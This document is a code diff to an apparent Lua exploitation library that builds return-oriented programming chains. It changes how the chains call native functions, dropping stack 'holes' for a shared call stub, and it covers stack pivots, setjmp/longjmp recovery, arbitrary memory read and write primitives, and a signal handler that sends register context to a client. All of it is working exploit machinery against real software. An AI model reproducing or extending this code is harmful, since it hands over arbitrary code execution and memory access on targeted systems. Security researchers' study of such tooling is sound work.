@@ -1538,12 +1538,14 @@ function ropchain:new(opt)
     opt = opt or {}
 
     local self = setmetatable({}, ropchain)
-    
+
+    if not ropchain.fcall_stub then
+        ropchain.create_fcall_stub(0x20000)
+    end
+
     self.stack_size = opt.stack_size or 0x2000
     self.stack_base = opt.stack_base or memory.alloc(self.stack_size)
     self.stack_offset = opt.start_from_base and 0 or 8
-
-    self.show_hole_corruption_info = opt.show_hole_corruption_info or false
 
     -- align stack base to 16 bytes
     if self.stack_base:tonumber() % 16 ~= 0 then
@@ -1554,13 +1556,33 @@ function ropchain:new(opt)
     end
 
     self.retval_addr = {}
-    self.hole_list = {}
 
     -- recover from call [rax+8] instruction
     self.recover_from_call = memory.alloc(0x10)
     lua.write_qword(self.recover_from_call+8, gadgets["pop rbx; ret"])
 
     return self
+end
+
+function ropchain.create_fcall_stub(size)
+    
+    ropchain.fcall_stub = {}
+    ropchain.fcall_stub.entry = memory.alloc(size) + (size - 0x100)  -- large padding
+    
+    local stub = ropchain({
+        stack_base = ropchain.fcall_stub.entry,
+        start_from_base = true
+    })
+
+    stub:push(0) -- fn addr
+
+    stub:push_store_rax_into_memory(0)
+    ropchain.fcall_stub.retval_addr = stub:get_rsp() - 0x10
+
+    stub:push_set_rsp(0)
+    ropchain.fcall_stub.return_addr = stub:get_rsp() - 0x8
+
+    ropchain.fcall_stub.chain = stub
 end
 
 function ropchain:__tostring()
@@ -1583,43 +1605,13 @@ function ropchain:__tostring()
 
     local idx = 1
     while idx < #qwords+1 do
-
         local offset = 8 * (idx-1)
         local val = hex(qwords[idx])
-        local skip = false
-
-        for start_offset, hole_size in pairs(self.hole_list) do
-            if offset == start_offset then
-
-                local hole_info = string.format("\n\thole size: %s bytes", hex(hole_size))
-                local corruption_info = ""
-
-                if self.show_hole_corruption_info then
-                    local hole_qwords = lua.read_multiple_qwords(self.stack_base + start_offset, hole_size / 8)
-                    for i,qword in ipairs(hole_qwords) do
-                        if qword:tonumber() ~= 0 then
-                            local corrupt_size = hole_size - 8*(i-1)
-                            corruption_info = string.format("\n\ttotal corruptions from prev execs: %s bytes", hex(corrupt_size))
-                            break
-                        end
-                    end
-                end
-                
-                table.insert(result, string.format("\t\t[...]%s%s\n\t\t[...]", hole_info, corruption_info))
-                idx = idx + hole_size / 8
-                skip = true
-                break
-            end
+        if value_symbol[val] then
+            val = val .. string.format("\t; %s", value_symbol[val])
         end
-
-        if not skip then
-            if value_symbol[val] then
-                val = val .. string.format("\t; %s", value_symbol[val])
-            end
-            table.insert(result, string.format("%s: %s", hex(self.stack_base + offset), val))
-            idx = idx + 1
-        end
-        
+        table.insert(result, string.format("%s: %s", hex(self.stack_base + offset), val))
+        idx = idx + 1
     end
 
     return "\n" .. table.concat(result, "\n")
@@ -1885,70 +1877,37 @@ function ropchain:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
     if r9 then self:push_set_r9(r9) end
 end
 
-function ropchain:push_fcall_raw(rip)
-    self:align_stack()
-    self:push(rip)
-end
-
-function ropchain:push_fcall(rip, rdi, rsi, rdx, rcx, r8, r9)
-    self:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
-    self:push_fcall_raw(rip)
-end
-
-function ropchain:push_fcall_with_ret(rip, rdi, rsi, rdx, rcx, r8, r9)
-    self:push_fcall(rip, rdi, rsi, rdx, rcx, r8, r9)
-    self:push_store_retval()
-end
-
-function ropchain:create_hole(hole_size)
-
-    assert(type(hole_size) == "number" and hole_size % 16 == 0)
-
-    self:align_stack()
-
-    local jump_to = self.stack_offset + hole_size + 0x10
-    self:push_set_rsp(self.stack_base + jump_to)
-
-    self.hole_list[self.stack_offset] = jump_to - self.stack_offset
-
-    self.stack_offset = jump_to
-end
-
 -- if `is_ptr` is set, rip is assumed to be ptr to the real address
-function ropchain:push_fcall_raw_safe(rip, hole_size, prep_arg_callback, is_ptr)
+function ropchain:push_fcall_raw(rip, prep_arg_callback, is_ptr)
+
+    local ret_value = memory.alloc(8)
+    table.insert(self.retval_addr, ret_value)
+
+    if is_ptr then
+        self:push_set_rax_from_memory(rip)
+        self:push_store_rax_into_memory(ropchain.fcall_stub.entry)
+    else
+        self:push_write_qword_memory(ropchain.fcall_stub.entry, rip)
+    end
+
+    self:push_write_qword_memory(ropchain.fcall_stub.retval_addr, ret_value)
 
     local push_size = 0
 
     local push_cb = function()
-        if is_ptr then
-            self:push_set_rax_from_memory(rip)
-            self:push_store_rax_into_memory(self:get_rsp() + push_size - 0x18)
-        else
-            self:push_write_qword_memory(self:get_rsp() + push_size, rip)
-        end
-        if prep_arg_callback then
-            prep_arg_callback()
-        end
-        self:create_hole(hole_size)
+        self:push_write_qword_memory(ropchain.fcall_stub.return_addr, self:get_rsp() + push_size)
+        prep_arg_callback()
+        self:push_set_rsp(ropchain.fcall_stub.entry)
     end
 
     push_size = self:mock_push(push_cb)
-
     push_cb()
-    self:push(0) -- will be changed
 end
 
-function ropchain:push_fcall_safe(rip, hole_size, rdi, rsi, rdx, rcx, r8, r9)
-    self:push_fcall_raw_safe(rip, hole_size, function()
+function ropchain:push_fcall(rip, rdi, rsi, rdx, rcx, r8, r9)
+    self:push_fcall_raw(rip, function()
         self:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
     end)
-end
-
-function ropchain:push_fcall_safe_with_ret(rip, hole_size, rdi, rsi, rdx, rcx, r8, r9)
-    self:push_fcall_raw_safe(rip, hole_size, function()
-        self:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
-    end)
-    self:push_store_retval()
 end
 
 function ropchain:push_store_retval()
@@ -2034,7 +1993,7 @@ function ropchain:finalize_for_execution(jmpbuf_backup)
     self.jmpbuf_backup = jmpbuf_backup or memory.alloc(self.jmpbuf_size)
 
     -- restore execution through longjmp
-    self:push_fcall_safe(libc_addrofs.longjmp, 0x80, self.jmpbuf_backup, 0)
+    self:push_fcall(libc_addrofs.longjmp, self.jmpbuf_backup, 0)
 
     self.finalized = true
 end
@@ -2086,7 +2045,7 @@ setmetatable(function_rop, {
     end
 })
 
-function function_rop:new(fn_addr, syscall_no)
+function function_rop:new(fn_addr, rax)
 
     assert(fn_addr, "invalid function address")
 
@@ -2094,13 +2053,11 @@ function function_rop:new(fn_addr, syscall_no)
     
     if not function_rop.chain then
         
-        local chain = ropchain({
-            stack_size = 0x4000,
-        })
+        local chain = ropchain()
 
         local placeholder = {
             fn_addr = memory.alloc(8),
-            syscall_no = memory.alloc(8),
+            rax = memory.alloc(8),
             rdi = memory.alloc(8),
             rsi = memory.alloc(8),
             rdx = memory.alloc(8),
@@ -2116,12 +2073,10 @@ function function_rop:new(fn_addr, syscall_no)
             chain:push_set_reg_from_memory("rdx", placeholder.rdx)
             chain:push_set_reg_from_memory("rsi", placeholder.rsi)
             chain:push_set_reg_from_memory("rdi", placeholder.rdi)
-            chain:push_set_rax_from_memory(placeholder.syscall_no)
+            chain:push_set_rax_from_memory(placeholder.rax)
         end
         
-        chain:push_fcall_raw_safe(placeholder.fn_addr, 0x2000, prep_arg_callback, true)
-        chain:push_store_retval()
-
+        chain:push_fcall_raw(placeholder.fn_addr, prep_arg_callback, true)
         chain:finalize_for_execution()
 
         chain.placeholder = placeholder
@@ -2129,7 +2084,7 @@ function function_rop:new(fn_addr, syscall_no)
     end
 
     self.fn_addr = fn_addr
-    self.syscall_no = syscall_no
+    self.rax = rax
 
     return self
 end
@@ -2139,7 +2094,7 @@ function function_rop:__call(rdi, rsi, rdx, rcx, r8, r9)
     local placeholder = function_rop.chain.placeholder
 
     lua.write_qword(placeholder.fn_addr, self.fn_addr)
-    lua.write_qword(placeholder.syscall_no, self.syscall_no or 0)
+    lua.write_qword(placeholder.rax, self.rax or 0)
     lua.write_qword(placeholder.rdi, ropchain.resolve_value(rdi or 0))
     lua.write_qword(placeholder.rsi, ropchain.resolve_value(rsi or 0))
     lua.write_qword(placeholder.rdx, ropchain.resolve_value(rdx or 0))
@@ -2451,18 +2406,16 @@ end
 native = {}
 
 function native.get_lua_opt(chain, fn, a1, a2, a3)
-    chain:push_fcall_raw_safe(fn, 0x1000, function()
+    chain:push_fcall_raw(fn, function()
         chain:push_set_rdx(a3)
         chain:push_set_rsi(a2)
         chain:push_set_reg_from_memory("rdi", a1)
     end)
-    chain:push_store_retval()
 end
 
 function native.gen_fcall(lua_state)
 
     local fcall = ropchain({
-        stack_size = 0x12000,
         start_from_base = true,
     })
 
@@ -2485,11 +2438,10 @@ function native.gen_fcall(lua_state)
         fcall:push_set_rax_from_memory(fcall.retval_addr[2])
     end
 
-    fcall:push_fcall_raw_safe(fcall.retval_addr[1], 0x1000, prep_arg_callback, true)
-    fcall:push_store_retval()
+    fcall:push_fcall_raw(fcall.retval_addr[1], prep_arg_callback, true)
 
     -- pass return value to caller
-    fcall:push_fcall_raw_safe(eboot_addrofs.lua_pushinteger, 0x1000, function()
+    fcall:push_fcall_raw(eboot_addrofs.lua_pushinteger, function()
         fcall:push_set_reg_from_memory("rsi", fcall.retval_addr[9])
         fcall:push_set_reg_from_memory("rdi", lua_state)
     end)
@@ -2500,14 +2452,13 @@ end
 function native.gen_read_buffer(lua_state)
 
     local read_buffer = ropchain({
-        stack_size = 0x5000,
         start_from_base = true,
     })
 
     native.get_lua_opt(read_buffer, eboot_addrofs.luaL_optinteger, lua_state, 2, 0)  -- 1 - addr to read
     native.get_lua_opt(read_buffer, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 2 - size
 
-    read_buffer:push_fcall_raw_safe(eboot_addrofs.lua_pushlstring, 0x1000, function()
+    read_buffer:push_fcall_raw(eboot_addrofs.lua_pushlstring, function()
         read_buffer:push_set_reg_from_memory("rdx", read_buffer.retval_addr[2])
         read_buffer:push_set_reg_from_memory("rsi", read_buffer.retval_addr[1])
         read_buffer:push_set_reg_from_memory("rdi", lua_state)
@@ -2519,7 +2470,6 @@ end
 function native.gen_write_buffer(lua_state)
 
     local write_buffer = ropchain({
-        stack_size = 0x5000,
         start_from_base = true,
     })
 
@@ -2528,7 +2478,7 @@ function native.gen_write_buffer(lua_state)
     native.get_lua_opt(write_buffer, eboot_addrofs.luaL_optinteger, lua_state, 2, 0)  -- 1 - dest to write
     native.get_lua_opt(write_buffer, eboot_addrofs.luaL_checklstring, lua_state, 3, write_buffer.string_len)  -- 2 - src buffer
 
-    write_buffer:push_fcall_raw_safe(libc_addrofs.memcpy, 0x1000, function()
+    write_buffer:push_fcall_raw(libc_addrofs.memcpy, function()
         write_buffer:push_set_reg_from_memory("rdx", write_buffer.string_len)
         write_buffer:push_set_reg_from_memory("rsi", write_buffer.retval_addr[2])
         write_buffer:push_set_reg_from_memory("rdi", write_buffer.retval_addr[1])
@@ -2543,13 +2493,10 @@ function native.create_dispatcher(pivot_handler)
     local jmpbuf_backup = memory.alloc(0x100)
     local lua_state = memory.alloc(0x8)
 
-    local stack_size = 0x4000
-
-    syscall_mmap(pivot_handler.pivot_base, stack_size)
+    syscall_mmap(pivot_handler.pivot_base, 0x2000)
 
     local dispatcher = ropchain({
         stack_base = pivot_handler.pivot_addr,
-        stack_size = stack_size,
         start_from_base = true,
     })
 
@@ -2557,7 +2504,7 @@ function native.create_dispatcher(pivot_handler)
     dispatcher:push_store_rdi_into_memory(lua_state)
 
     -- backup current context
-    dispatcher:push_fcall_safe(libc_addrofs.setjmp, 0x1000, jmpbuf_backup)
+    dispatcher:push_fcall(libc_addrofs.setjmp, jmpbuf_backup)
 
     -- fix rsp
     dispatcher:push_set_rax_from_memory(jmpbuf_backup+0x18)
@@ -2572,7 +2519,7 @@ function native.create_dispatcher(pivot_handler)
     native.get_lua_opt(dispatcher, eboot_addrofs.luaL_optinteger, lua_state, 1, 0)
 
     -- pivot to appropriate handler
-    dispatcher:push_set_rax_from_memory(dispatcher.retval_addr[1])
+    dispatcher:push_set_rax_from_memory(dispatcher.retval_addr[2])
     dispatcher:dispatch_jumptable_with_rax_index(jump_table)
 
     return {
@@ -2612,6 +2559,7 @@ function native.init()
 end
 
 function native.fcall_with_rax(fn_addr, rax, rdi, rsi, rdx, rcx, r8, r9)
+    assert(fn_addr)
     return uint64(native_invoke(
         native_cmd.fcall,
         uint64(fn_addr):tonumber(),
@@ -2630,14 +2578,16 @@ function native.fcall(fn_addr, rdi, rsi, rdx, rcx, r8, r9)
 end
 
 function native.read_buffer(addr, size)
+    assert(addr and size)
     return native_invoke(
         native_cmd.read_buffer,
-        ropchain.resolve_value(addr or 0):tonumber(),
+        ropchain.resolve_value(addr):tonumber(),
         ropchain.resolve_value(size or 0):tonumber()
     )
 end
 
 function native.write_buffer(addr, buf)
+    assert(addr and buf)
     native_invoke(
         native_cmd.write_buffer,
         ropchain.resolve_value(addr or 0):tonumber(),
@@ -2676,13 +2626,10 @@ function signal.setup_handler(pivot_handler)
         sys_write_addr = syscall.syscall_address
     end
 
-    local stack_size = 0x4000
-
-    syscall_mmap(pivot_handler.pivot_base, stack_size)
+    syscall_mmap(pivot_handler.pivot_base, 0x2000)
 
     local chain = ropchain({
         stack_base = pivot_handler.pivot_addr,
-        stack_size = stack_size,
         start_from_base = true,
     })
 
@@ -2696,7 +2643,7 @@ function signal.setup_handler(pivot_handler)
     chain:push_store_rdx_into_memory(ucontext_struct_addr)
 
     -- send signal info to client
-    chain:push_fcall_raw_safe(sys_write_addr, 0x1000, function()
+    chain:push_fcall_raw(sys_write_addr, function()
         chain:push_set_rdx(0x18)
         chain:push_set_rsi(output_addr)
         chain:push_set_reg_from_memory("rdi", signal.fd_addr)
@@ -2704,7 +2651,7 @@ function signal.setup_handler(pivot_handler)
     end)
 
     -- send mcontext buffer to client
-    chain:push_fcall_raw_safe(sys_write_addr, 0x1000, function()
+    chain:push_fcall_raw(sys_write_addr, function()
 
         chain:push_set_rdx(0x100)
 
